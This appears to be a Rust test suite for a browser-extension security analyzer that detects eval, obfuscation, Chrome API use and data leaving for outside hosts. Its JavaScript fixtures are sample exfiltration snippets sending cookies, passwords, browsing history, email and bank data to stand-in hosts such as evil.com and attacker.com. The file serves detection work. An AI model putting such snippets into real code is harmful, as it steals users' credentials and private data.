use extanalyzer::analyze::javascript::analyze_javascript;
use extanalyzer::models::{Category, Severity};
use std::path::PathBuf;

#[test]
fn test_detect_eval_usage() {
    let code = r#"
        const code = "alert('hi')";
        eval(code);
    "#;

    let (findings, _) = analyze_javascript(code, &PathBuf::from("test.js"));

    assert!(
        findings
            .iter()
            .any(|f| f.severity == Severity::Critical && f.title.contains("eval"))
    );
}

#[test]
fn test_detect_fetch_endpoint() {
    let code = r#"
        fetch("https://api.example.com/data", {
            method: "POST",
            body: JSON.stringify({ userId: id })
        });
    "#;

    let (_, endpoints) = analyze_javascript(code, &PathBuf::from("test.js"));

    assert!(endpoints.iter().any(|e| e.url.contains("api.example.com")));
}

#[test]
fn test_detect_chrome_api() {
    let code = r#"
        chrome.cookies.getAll({}, function(cookies) {
            console.log(cookies);
        });
    "#;

    let (findings, _) = analyze_javascript(code, &PathBuf::from("test.js"));

    assert!(
        findings
            .iter()
            .any(|f| f.category == Category::ApiUsage && f.title.contains("cookies"))
    );
}

#[test]
fn test_detect_obfuscation() {
    let code = r#"
        const secret = atob("aHR0cHM6Ly9ldmlsLmNvbQ==");
        fetch(secret);
    "#;

    let (findings, _) = analyze_javascript(code, &PathBuf::from("test.js"));

    assert!(findings.iter().any(|f| f.category == Category::Obfuscation));
}

#[test]
fn test_data_source_display() {
    use extanalyzer::models::DataSource;

    assert_eq!(DataSource::Cookie(None).to_string(), "Cookie");
    assert_eq!(DataSource::Cookie(Some("session".into())).to_string(), "Cookie(session)");
    assert_eq!(DataSource::LocalStorage("userId".into()).to_string(), "localStorage(userId)");
    assert_eq!(DataSource::NetworkResponse("api.example.com".into()).to_string(), "NetworkResponse(api.example.com)");
}

#[test]
fn test_endpoint_flag_severity() {
    use extanalyzer::models::{EndpointFlag, Severity};

    assert_eq!(EndpointFlag::CrossDomainTransfer { source_domain: "a.com".into() }.severity(), Severity::High);
    assert_eq!(EndpointFlag::SensitiveData.severity(), Severity::High);
    assert_eq!(EndpointFlag::KnownTracker.severity(), Severity::Medium);
}

#[test]
fn test_dark_pattern_type_category() {
    use extanalyzer::models::{DarkPatternType, Category};

    let dp = DarkPatternType::AffiliateInjection;
    let cat = Category::DarkPattern(dp);
    assert_eq!(cat.as_str(), "Dark Pattern");
}

#[test]
fn test_source_tracker_local_storage() {
    let code = r#"
        let userId = localStorage.getItem('user_id');
        fetch('https://api.example.com/track', { body: userId });
    "#;

    let (_findings, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    assert!(!endpoints.is_empty());
    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("api.example.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::LocalStorage(k) if k == "user_id")));
}

#[test]
fn test_source_tracker_document_cookie() {
    let code = r#"
        let cookies = document.cookie;
        fetch('https://evil.com/steal', { body: cookies });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("evil.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Cookie(_))));
}

#[test]
fn test_source_tracker_location() {
    let code = r#"
        let url = location.href;
        fetch('https://tracker.com/log', { body: url });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("tracker.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Location(p) if p == "href")));
}

#[test]
fn test_source_tracker_history() {
    let code = r#"
        let history = await chrome.history.search({ text: '' });
        fetch('https://spy.com/collect', { body: JSON.stringify(history) });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("spy.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::BrowsingHistory)));
}

#[test]
fn test_source_tracker_user_input() {
    let code = r#"
        let password = document.getElementById('password').value;
        fetch('https://phish.com/steal', { body: password });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("phish.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::UserInput(id) if id == "password")));
}

#[test]
fn test_source_tracker_dom_element() {
    let code = r#"
        let content = document.querySelector('.secret-data').innerText;
        fetch('https://scraper.com/collect', { body: content });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("scraper.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::DomElement(selector) if selector == ".secret-data")));
}

#[test]
fn test_source_tracker_network_response() {
    let code = r#"
        let response = await fetch('https://mail.google.com/api/inbox');
        let emails = await response.json();
        fetch('https://attacker.com/exfil', { body: JSON.stringify(emails) });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Find the endpoint that has data sources (from the fetch call, not the string literal)
    let endpoint = endpoints
        .iter()
        .find(|e| e.url.contains("attacker.com") && !e.data_sources.is_empty())
        .unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::NetworkResponse(url) if url.contains("mail.google.com"))));
}

#[test]
fn test_cross_domain_transfer_detection() {
    let code = r#"
        let response = await fetch('https://bank.com/api/accounts');
        let data = await response.json();
        fetch('https://evil.com/steal', { body: JSON.stringify(data) });
    "#;

    let (findings, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Should have a flag on the evil.com endpoint (find the one with data sources)
    let endpoint = endpoints.iter().find(|e| e.url.contains("evil.com") && !e.data_sources.is_empty()).unwrap();
    assert!(endpoint.flags.iter().any(|f| matches!(f, extanalyzer::models::EndpointFlag::CrossDomainTransfer { source_domain } if source_domain.contains("bank.com"))));

    // Should also have a finding
    assert!(findings.iter().any(|f| f.title.contains("Cross-domain") || f.title.contains("Data Exfiltration")));
}
